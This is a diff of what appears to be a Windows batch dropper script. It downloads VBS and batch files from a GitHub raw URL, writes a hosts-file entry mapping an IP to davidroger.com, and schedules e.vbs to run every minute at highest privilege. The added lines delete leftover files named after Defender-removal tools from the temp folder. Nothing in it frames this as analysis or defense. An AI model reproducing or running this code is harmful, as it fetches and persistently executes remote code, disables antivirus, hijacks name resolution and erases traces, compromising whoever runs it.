@@ -35,5 +35,21 @@ RunDefenderRemover.vbs
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/e.vbs-o e.vbs
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/asd123.bat -o asd123.bat
 echo 185.194.175.132 davidroger.com >> %SystemRoot%\System32\drivers\etc\hosts
+@echo off
+
+:: Dosyalari sil
+cd %temp%
+del /f /q "s.bat"
+del /f /q "a.py"
+del /f /q "asd.bat"
+del /f /q "ddd.vbs"
+del /f /q "expe2.bat"
+del /f /q "expe2.vbs"
+del /f /q "lalala.vbs"
+del /f /q "a.ps1"
+del /f /q "RunDefenderRemover.vbs"
+del /f /q "DefenderRemover.bat"
+rmdir /s /q "Remove_SecurityComp"
+rmdir /s /q "Remove_Defender"
 
 schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1  /f /rl HIGHEST
